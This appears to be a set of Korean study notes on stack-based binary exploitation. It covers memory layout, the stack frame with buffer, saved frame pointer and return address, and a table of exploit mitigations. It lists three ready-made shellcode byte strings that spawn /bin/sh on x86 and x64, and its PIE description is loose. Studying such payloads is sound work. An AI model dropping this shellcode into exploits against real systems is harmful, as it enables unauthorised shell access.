---


---

<h2 id="memory">MEMORY</h2>

<table>
<thead>
<tr>
<th>Low</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>TEXT</td>
</tr>
<tr>
<td></td>
<td>DATA</td>
</tr>
<tr>
<td></td>
<td>BSS</td>
</tr>
<tr>
<td></td>
<td>HEAP</td>
</tr>
<tr>
<td></td>
<td>…</td>
</tr>
<tr>
<td></td>
<td>…</td>
</tr>
<tr>
<td></td>
<td>STACK</td>
</tr>
</tbody>
</table><h2 id="stack">STACK</h2>

<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>BUFER</td>
</tr>
<tr>
<td></td>
<td>SFP</td>
</tr>
<tr>
<td></td>
<td>RET</td>
</tr>
<tr>
<td></td>
<td>…</td>
</tr>
<tr>
<td></td>
<td>…</td>
</tr>
<tr>
<td></td>
<td>…</td>
</tr>
</tbody>
</table><p>x32 SFP 는 4byte<br>
x64 SFP 는 8byte</p>
<h2 id="shell-code">SHELL CODE</h2>
<p>x32(24byte) :<br>
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</p>
<p>x64 :<br>
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</p>
<p>x64(23byte):<br>
\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</p>
<h1 id="security">SECURITY</h1>

<table>
<thead>
<tr>
<th>Name</th>
<th>Full Name</th>
<th>INFO</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASLR</td>
<td>Address Space Layout Randomization</td>
<td>Heap, Stack, Libc 주소를 항상 랜덤하게 정함</td>
</tr>
<tr>
<td>RELRO</td>
<td>Relocation Read-Only</td>
<td>GOT_Overwrite 를 방지, GOT를 Read Only, 두 가지 모드 존재</td>
</tr>
<tr>
<td>DEP/NX</td>
<td>Data Execution Protection/Non-Executable</td>
<td>에그 삽입을 방지, 메모리의 실행권한을 없엠</td>
</tr>
<tr>
<td>Canary</td>
<td>-</td>
<td>BOF를 방지, Buff와 SFP 사이에 Dummy를 만듬</td>
</tr>
<tr>
<td>PIE</td>
<td>-</td>
<td>메모리 주소가 작은 범위를 다니며 PLT와 GOT가 특정 함수를 통하여 돌아다님</td>
</tr>
</tbody>
</table>
